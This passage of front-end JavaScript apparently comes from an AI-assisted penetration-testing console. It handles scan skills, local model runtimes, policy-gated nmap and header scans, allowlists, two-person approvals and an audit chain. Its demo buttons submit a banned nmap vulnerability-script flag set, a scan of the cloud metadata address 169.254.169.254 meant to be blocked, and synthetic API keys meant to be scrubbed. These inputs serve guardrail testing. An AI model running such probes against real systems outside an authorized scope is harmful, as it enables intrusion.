      const checked = Array.from(document.querySelectorAll('input[name="skillStep"]:checked')).map((el) => el.value);
      if (!checked.length) {
        flashToast("Select at least one stage for the custom skill.");
        return;
      }
      const steps = checked.map((tool) => {
        if (tool === "tcp_port_probe") return { stage: "ports", tool, params: { ports: [80, 443, 8000] }, mode: "execute" };
        if (tool === "sandbox_script") return { stage: "go_dual_verify", tool, params: { language: "go" }, mode: "execute" };
        if (tool === "nmap") return { stage: "gated_nmap", tool, params: { flags: ["-sV", "-T2", "--open"], ports: "80,443" }, mode: "recommend_approval" };
        return { stage: tool, tool, params: {}, mode: "execute" };
      });
      const res = await api("/api/v1/skills", {
        method: "POST",
        body: JSON.stringify({
          skill_id: $("newSkillId").value.trim().toLowerCase(),
          name: $("newSkillName").value.trim(),
          category: "personalized",
          description: $("newSkillDesc").value.trim(),
          steps,
          prioritization_rules: { missing_hsts_severity: $("newSkillHstsSev").value },
          report_focus: $("newSkillDesc").value.trim(),
        }),
      });
      if (res.ok) {
        $("newSkillId").value = "";
        $("newSkillName").value = "";
        $("newSkillDesc").value = "";
        flashToast(`Saved personalized skill '${res.data.skill.name}'!`);
        await refreshSessionAndData();
      } else {
        flashToast(`Skill rejected (${res.status}): ${JSON.stringify(res.data.detail)}`);
      }
    });

    // Local AI Model Hub & Quantization tab
    $("rtProvider").addEventListener("change", () => {
      const d = PROVIDER_DEFAULTS[$("rtProvider").value];
      if (d) {
        $("rtBaseUrl").value = d.url;
        $("rtModel").value = d.model;
      }
    });

    $("runtimeSwitchForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const res = await api("/api/v1/models/runtime", {
        method: "PUT",
        body: JSON.stringify({
          provider: $("rtProvider").value,
          base_url: $("rtBaseUrl").value.trim(),
          model: $("rtModel").value.trim(),
          quantization: $("rtQuant").value,
          context_length: Number($("hwCtx").value || 8192),
        }),
      });
      if (res.ok) {
        flashToast(`Switched AI runtime to ${res.data.active_runtime.active_provider} (${res.data.active_runtime.active_model}).`);
        await refreshSessionAndData();
      } else {
        flashToast(`Rejected (${res.status}): ${res.data.detail}`);
      }
    });

    $("quantCalcForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const customRepo = $("hwCustomRepo").value.trim() || null;
      const customParams = $("hwCustomParams").value ? Number($("hwCustomParams").value) : null;
      const res = await api("/api/v1/models/recommend", {
        method: "POST",
        body: JSON.stringify({
          vram_gb: Number($("hwVram").value || 0),
          system_ram_gb: Number($("hwRam").value || 16),
          context_length: Number($("hwCtx").value || 8192),
          task: $("hwTask").value,
          custom_hf_repo: customRepo,
          custom_params_b: customParams,
        }),
      });
      if (!res.ok) {
        flashToast(`Error: ${res.data.detail}`);
        return;
      }
      const recs = res.data.recommendations || [];
      $("quantResultsBox").innerHTML = recs.slice(0, 4).map((r) => `
        <div class="quant-card">
          <div class="quant-head">
            <strong>${escapeHtml(r.name)} · <code>${escapeHtml(r.quantization)}</code></strong>
            <span class="tag tag-low">${escapeHtml(r.execution_mode)} · ${r.memory_estimate_gb.total_required_gb} GB</span>
          </div>
          <div style="color:var(--muted)">${escapeHtml(r.specialty)} (Quality ~${r.quality_retention_pct}%)</div>
          <div><code>${escapeHtml(r.commands.ollama_pull_hf)}</code></div>
          <div><code>${escapeHtml(r.commands.lm_studio_cli)}</code></div>
          <div class="btn-row">
            <button type="button" class="btn btn-xs btn-secondary" data-use-hf="${escapeHtml(r.ollama_hf_model)}" data-use-q="${escapeHtml(r.quantization)}">Fill Ollama Runtime</button>
          </div>
        </div>
      `).join("") || `<div class="check-item"><span class="check-fail">No model fits this memory budget — increase RAM or choose smaller model.</span></div>`;

      $("quantResultsBox").querySelectorAll("button[data-use-hf]").forEach((btn) => {
        btn.addEventListener("click", () => {
          $("rtProvider").value = "ollama";
          $("rtBaseUrl").value = "http://127.0.0.1:11434/v1";
          $("rtModel").value = btn.dataset.useHf;
          $("rtQuant").value = btn.dataset.useQ;
          flashToast("Populated Ollama Hugging Face GGUF config on the left — click Switch Active Runtime when Ollama is running.");
        });
      });
    });

    // Scan tab
    $("scanToolSelect").addEventListener("change", () => {
      updateScanToolHint();
      const name = $("scanToolSelect").value;
      let tmpl = TOOL_PARAM_TEMPLATES[name] || {};
      if (name === "http_headers" && $("scanTarget").value !== "127.0.0.1") {
        tmpl = { scheme: "https", method: "HEAD", port: 443, path: "/" };
      }
      $("scanParams").value = JSON.stringify(tmpl, null, 2);
    });

    $("scanForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      let params = {};
      try {
        params = JSON.parse($("scanParams").value || "{}");
      } catch (err) {
        setBanner("scanStatusBanner", "err", `Invalid JSON: ${err.message}`);
        return;
      }
      setBanner("scanStatusBanner", "warn", "Evaluating policy, DNS pinning, and invoking Layer 2 MCP...");
      const res = await api("/api/v1/scan", {
        method: "POST",
        body: JSON.stringify({
          engagement_id: state.engagementId,
          target: $("scanTarget").value.trim(),
          tool_name: $("scanToolSelect").value,
          params,
        }),
      });
      if (res.status === 202) {
        setBanner("scanStatusBanner", "warn", `QUEUED FOR TWO-PERSON APPROVAL: ${res.data.approval?.request_id}`);
      } else if (res.ok) {
        setBanner("scanStatusBanner", "ok", `COMPLETED via MCP · Audit #${res.data.audit_id} · SHA-256 ${String(res.data.audit_hash).slice(0, 14)}…`);
      } else {
        const msg = res.data?.detail?.message || res.data?.detail || JSON.stringify(res.data);
        setBanner("scanStatusBanner", "err", `POLICY REJECTED (HTTP ${res.status}): ${msg}`);
      }
      $("scanOutput").textContent = JSON.stringify(res.data, null, 2);
      await refreshSessionAndData();
    });

    $("testBannedFlagBtn").addEventListener("click", () => {
      $("scanToolSelect").value = "nmap";
      updateScanToolHint();
      $("scanParams").value = JSON.stringify({ flags: ["-sV", "-T4", "--script=vuln"], ports: "80,443" }, null, 2);
      $("scanForm").requestSubmit();
    });

    // Script studio
    $("modeAiBtn").addEventListener("click", () => {
      $("aiGenForm").hidden = false;
      $("customValForm").hidden = true;
      $("modeAiBtn").className = "btn btn-sm btn-primary";
      $("modeCustomBtn").className = "btn btn-sm btn-ghost";
    });
    $("modeCustomBtn").addEventListener("click", () => {
      $("aiGenForm").hidden = true;
      $("customValForm").hidden = false;
      $("modeCustomBtn").className = "btn btn-sm btn-primary";
      $("modeAiBtn").className = "btn btn-sm btn-ghost";
    });

    $("injectSecretDemoBtn").addEventListener("click", () => {
      const sampleKey = ["sk", "redactionDemoOnly0000000000"].join("-");
      const sampleJwt = ["eyJhbGciOiJIUzI1NiJ9", "eyJzdWIiOiJvcCJ9", "demoSigOnly"].join(".");
      $("genObjective").value =
        `Verify HTTP defensive security headers on target. Note: api_key=${sampleKey} and Authorization: Bearer ${sampleJwt}`;
      flashToast("Added synthetic secrets — submit to see LLM Proxy scrub them!");
    });

    $("aiGenForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const lang = $("genLanguage").value;
      const autoRun = $("genAutoRun").checked;
      setBanner("scriptMetaBanner", "warn", `Secret scrubber → Local AI (${lang}) → validator${autoRun ? " → Go Sandbox" : ""}...`);
      $("runValidatedBtn").hidden = true;

      const res = await api("/api/v1/script/generate", {
        method: "POST",
        body: JSON.stringify({
          engagement_id: state.engagementId,
          target: $("genTarget").value.trim(),
          language: lang,
          objective: $("genObjective").value,
          auto_run: autoRun,
        }),
      });

      renderValidationChecks(res.data?.validation);
      if (res.data?.script) {
        $("generatedCodeLabel").hidden = false;
        $("generatedCodeBox").hidden = false;
        $("generatedCodeBox").textContent = res.data.script;
      }

      if (res.ok) {
        state.lastValidatedScriptId = res.data.script_id;
        $("runValidatedBtn").hidden = false;
        const meta = res.data.metadata || {};
        const scrubNote = meta.scrubbed_secrets?.length ? ` · Scrubbed: ${meta.scrubbed_secrets.join(", ")}` : "";
        setBanner("scriptMetaBanner", "ok", `${res.data.script_id} VALIDATED (${lang}) · ${meta.tokens_used} tokens${scrubNote}`);
        if (res.data.execution) {
          const sb = res.data.execution.sandbox || {};
          $("sandboxOutput").textContent =
            `[Go Sandbox Runner] exit_code=${sb.exit_code} duration=${sb.duration_ms}ms egress_mode=${sb.egress_mode}\n\n--- STDOUT ---\n${sb.stdout || "(empty)"}\n` +
            (sb.stderr ? `\n--- STDERR ---\n${sb.stderr}\n` : "") +
            `\n--- PROPOSED IPV4 EGRESS RULES (NOT APPLIED) ---\n${(sb.egress_rules || []).join("\n")}`;
        } else {
          $("sandboxOutput").textContent = "Validated. Click 'Run in Go Sandbox' above.";
        }
      } else {
        const msg = res.data?.detail?.message || res.data?.detail || "Validation rejected script.";
        setBanner("scriptMetaBanner", "err", `REJECTED (HTTP ${res.status}): ${msg}`);
        $("sandboxOutput").textContent = JSON.stringify(res.data, null, 2);
      }
      await refreshSessionAndData();
    });

    document.querySelectorAll("button[data-preset]").forEach((btn) => {
      btn.addEventListener("click", () => {
        const p = SCRIPT_PRESETS[btn.dataset.preset];
        if (!p) return;
        $("valLanguage").value = p.lang;
        $("valScriptBody").value = p.code;
      });
    });

    $("customValForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      $("runValidatedBtn").hidden = true;
      const res = await api("/api/v1/script/validate", {
        method: "POST",
        body: JSON.stringify({
          engagement_id: state.engagementId,
          target: $("valTarget").value.trim(),
          language: $("valLanguage").value,
          script: $("valScriptBody").value,
        }),
      });
      renderValidationChecks(res.data?.validation);
      $("generatedCodeLabel").hidden = true;
      $("generatedCodeBox").hidden = true;
      if (res.ok) {
        state.lastValidatedScriptId = res.data.script_id;
        $("runValidatedBtn").hidden = false;
        setBanner("scriptMetaBanner", "ok", `PASSED validation → ${res.data.script_id}`);
      } else {
        setBanner("scriptMetaBanner", "err", `BLOCKED BY VALIDATOR (Audit #${res.data.audit_id ?? "-"})`);
        $("sandboxOutput").textContent = JSON.stringify(res.data, null, 2);
      }
      await refreshSessionAndData();
    });

    $("runValidatedBtn").addEventListener("click", async () => {
      if (!state.lastValidatedScriptId) return;
      const res = await api("/api/v1/script/run", {
        method: "POST",
        body: JSON.stringify({ script_id: state.lastValidatedScriptId }),
      });
      if (res.ok) {
        const sb = res.data.sandbox || {};
        setBanner("scriptMetaBanner", "ok", `Executed ${res.data.script_id} · exit=${sb.exit_code} · ${sb.duration_ms}ms`);
        $("sandboxOutput").textContent = sb.stdout || sb.stderr || "(empty)";
      }
      await refreshSessionAndData();
    });

    // Add allowlist
    $("addAllowlistForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const res = await api("/api/v1/allowlist", {
        method: "POST",
        body: JSON.stringify({
          engagement_id: state.engagementId,
          target: $("newTargetInput").value.trim(),
          description: $("newTargetDesc").value.trim(),
        }),
      });
      if (res.ok) {
        $("newTargetInput").value = "";
        $("newTargetDesc").value = "";
        flashToast(`Added '${res.data.entry.target}' to ${state.engagementId}.`);
      } else {
        flashToast(`Rejected (${res.status}): ${res.data.detail}`);
      }
      await refreshSessionAndData();
    });

    // Verify audit chain
    $("verifyChainBtn").addEventListener("click", async () => {
      const res = await api("/api/v1/audit/verify");
      if (res.ok && res.data.valid) {
        setBanner("chainVerifyBanner", "ok", `VERIFIED: ${res.data.checked_entries} immutable entries · Head SHA-256: ${res.data.head_hash}`);
      } else {
        setBanner("chainVerifyBanner", "err", `CHAIN ERROR: ${JSON.stringify(res.data)}`);
      }
    });

    // Overview quick scenarios
    $("quickReconPipeline").addEventListener("click", async () => {
      $("quickActionOut").textContent = "Running Dual-Verify Recon Agent (Skill: polyglot-sandbox-verify → MCP + Go Sandbox + Memory Triage)...";
      const res = await api("/api/v1/recon/run", {
        method: "POST",
        body: JSON.stringify({
          engagement_id: "ENG-LOCAL-LAB",
          target: "127.0.0.1",
          skill_id: "polyglot-sandbox-verify",
          queue_gated_followups: false,
        }),
      });
      if (res.ok) {
        renderReconRunDetail(res.data.run);
        $("quickActionOut").textContent = res.data.run.report_markdown.slice(0, 950) + "\n...\n[Open 'Auto Recon Agent' tab for full interactive triage!]";
      } else {
        $("quickActionOut").textContent = JSON.stringify(res.data, null, 2);
      }
      await refreshSessionAndData();
    });

    $("quickGoScript").addEventListener("click", async () => {
      $("quickActionOut").textContent = "Generating Go script → gofmt + go vet + go build → Go Sandbox...";
      const res = await api("/api/v1/script/generate", {
        method: "POST",
        body: JSON.stringify({
          engagement_id: "ENG-LOCAL-LAB",
          target: "127.0.0.1",
          language: "go",
          objective: "Audit HTTP security headers and return JSON summary",
          auto_run: true,
        }),
      });
      const sb = res.data?.execution?.sandbox;
      $("quickActionOut").textContent = sb ? `[Go ${res.data.script_id} | ${sb.duration_ms}ms]\n${sb.stdout}` : JSON.stringify(res.data, null, 2);
      await refreshSessionAndData();
    });

    $("quickBlockTest").addEventListener("click", async () => {
      const res = await api("/api/v1/scan", {
        method: "POST",
        body: JSON.stringify({
          engagement_id: "ENG-2026-001",
          target: "169.254.169.254",
          tool_name: "http_headers",
        }),
      });
      $("quickActionOut").textContent = `[HTTP ${res.status} BLOCKED & HASH-LOGGED]\n${JSON.stringify(res.data, null, 2)}`;
      await refreshSessionAndData();
    });

    $("quickApprovalTest").addEventListener("click", async () => {
      const res = await api("/api/v1/scan", {
        method: "POST",
        body: JSON.stringify({
          engagement_id: "ENG-2026-001",
          target: "198.51.100.10",
          tool_name: "nmap",
          params: { flags: ["-sV", "-T2", "--open"], ports: "80,443" },
        }),
      });
      $("quickActionOut").textContent = `[HTTP ${res.status} QUEUED]\nSwitch to lead-sara (Approver) in top bar to review!\n${JSON.stringify(res.data, null, 2)}`;
      await refreshSessionAndData();
    });
  }

  async function init() {
    window.RedstrikeWorkspace.init({
      request: api,
      getContext: () => ({ engagementId: state.engagementId, operatorId: state.me?.operator_id,
        role: state.me?.role, skills: state.skills }),
    });
    wireEvents();
    await refreshHealth();

    const boot = await api("/api/v1/demo/bootstrap");
    if (boot.ok && Array.isArray(boot.data.profiles) && boot.data.profiles.length) {
      state.demoProfiles = boot.data.profiles;
      const sel = $("roleSelect");
      sel.innerHTML = state.demoProfiles.map((p) =>
        `<option value="${escapeHtml(p.token)}">${escapeHtml(p.label)}</option>`
      ).join("");
      state.token = state.demoProfiles[0].token;
      $("demoRoleWrap").hidden = false;
      await refreshSessionAndData();
      // Auto-populate quantization calculator once so tab opens rich and ready.
      $("quantCalcForm").requestSubmit();
    } else if (state.token) {
      await refreshSessionAndData();
    } else {
      $("tokenDialog").showModal();
    }
  }

  init();
})();
